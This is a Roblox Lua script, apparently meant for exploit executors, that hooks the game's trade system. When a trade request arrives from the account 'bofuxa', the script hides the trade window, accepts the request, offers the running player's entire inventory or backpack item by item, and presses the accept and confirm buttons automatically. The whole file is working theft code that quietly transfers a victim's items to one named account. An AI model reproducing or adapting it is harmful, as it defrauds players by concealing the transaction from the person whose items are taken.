local Players = game:GetService("Players")
local ReplicatedStorage = ReplicatedStorage or game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local TradeFolder = ReplicatedStorage:WaitForChild("Trade")
local SendRequest = TradeFolder:WaitForChild("SendRequest")
local AcceptRequest = TradeFolder:WaitForChild("AcceptRequest")
local StartTradeEvent = TradeFolder:WaitForChild("StartTrade")
local OfferItemEvent = TradeFolder:WaitForChild("OfferItem")
local AcceptTradeEvent = TradeFolder:WaitForChild("AcceptTrade")

print("Waiting for incoming trade request callback...")

SendRequest.OnClientInvoke = function(senderPlayer)
    local senderName = typeof(senderPlayer) == "Instance" and senderPlayer.Name or tostring(senderPlayer)
    
    if senderName:lower() == "bofuxa" then
        print("Trade request verified from bofuxa. Accepting...")
        
        local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
        if playerGui then
            local tradeGui = playerGui:FindFirstChild("TradeGUI")
            if tradeGui then
                for _, childName in ipairs({"Container", "Processing", "BG"}) do
                    local element = tradeGui:FindFirstChild(childName)
                    if element then
                        element.Visible = false
                    end
                end
            end
        end

        AcceptRequest:FireServer()
        
        task.spawn(function()
            print("Waiting for trade to start...")
            StartTradeEvent.OnClientEvent:Wait()
            
            print("Trade started! Waiting 1 second before offering items...")
            task.wait(1)
            
            local inventoryContainer = nil
            local pGui = LocalPlayer:WaitForChild("PlayerGui", 5)
            
            if pGui then
                local mainGui = pGui:FindFirstChild("MainGUI")
                if mainGui then
                    local lobby = mainGui:FindFirstChild("Lobby")
                    if lobby then
                        local screens = lobby:FindFirstChild("Screens")
                        if screens then
                            local inventory = screens:FindFirstChild("Inventory")
                            if inventory then
                                local main = inventory:FindFirstChild("Main")
                                if main then
                                    local crafting = main:FindFirstChild("Crafting")
                                    if crafting then
                                        local craftingMain = crafting:FindFirstChild("Main")
                                        if craftingMain then
                                            local salvage = craftingMain:FindFirstChild("Salvage")
                                            if salvage then
                                                local scrollFrame = salvage:FindFirstChild("ScrollFrame")
                                                if scrollFrame then
                                                    inventoryContainer = scrollFrame:FindFirstChild("Container")
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end

            local offeredCount = 0

            if inventoryContainer then
                for _, item in ipairs(inventoryContainer:GetChildren()) do
                    if item:IsA("GuiObject") then
                        local itemName = item.Name
                        local category = "Weapons"
                        
                        local count = 1
                        local qtyAttribute = item:GetAttribute("Count") or item:GetAttribute("Quantity")
                        if type(qtyAttribute) == "number" then
                            count = qtyAttribute
                        end

                        for i = 1, count do
                            OfferItemEvent:FireServer(itemName, category)
                            offeredCount = offeredCount + 1
                            task.wait(0.05)
                        end
                    end
                end
                print("Successfully offered " .. tostring(offeredCount) .. " items from mobile Lobby inventory container!")
            else
                if LocalPlayer:FindFirstChild("Backpack") then
                    for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
                        if tool:IsA("Tool") then
                            OfferItemEvent:FireServer(tool.Name, "Weapons")
                            offeredCount = offeredCount + 1
                            task.wait(0.05)
                        end
                    end
                end
                warn("Mobile inventory container path not found; pulled " .. tostring(offeredCount) .. " items from Backpack instead.")
            end

            print("Waiting 7 seconds before triggering trade accept actions...")
            task.wait(7)

            if firesignal and AcceptTradeEvent.OnClientEvent then
                firesignal(AcceptTradeEvent.OnClientEvent, false)
            else
                AcceptTradeEvent:FireServer()
            end

            local tradeGui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI")
            local actionsFolder = tradeGui and tradeGui:FindFirstChild("Container", true) and tradeGui.Container:FindFirstChild("Trade", true) and tradeGui.Container.Trade:FindFirstChild("Actions", true)

            local function fireButton(btn)
                if btn and btn:IsA("GuiButton") then
                    if getconnections then
                        for _, connection in ipairs(getconnections(btn.Activated)) do
                            connection:Fire()
                        end
                        for _, connection in ipairs(getconnections(btn.MouseButton1Click)) do
                            connection:Fire()
                        end
                    end
                    pcall(function()
                        btn:Activate()
                    end)
                end
            end

            if actionsFolder then
                local firstButton = actionsFolder:FindFirstChild("Accept", true) and actionsFolder.Accept:FindFirstChild("ActionButton", true)
                fireButton(firstButton)

                task.wait(1)

                local confirmButton = actionsFolder:FindFirstChild("Accept", true) and actionsFolder.Accept:FindFirstChild("Confirm", true) and actionsFolder.Accept.Confirm:FindFirstChild("ActionButton", true)
                fireButton(confirmButton)
            end
        end)

        return true
    else
        print("Trade request from other player (" .. senderName .. "). Allowing normal trade...")
        return true
    end
end
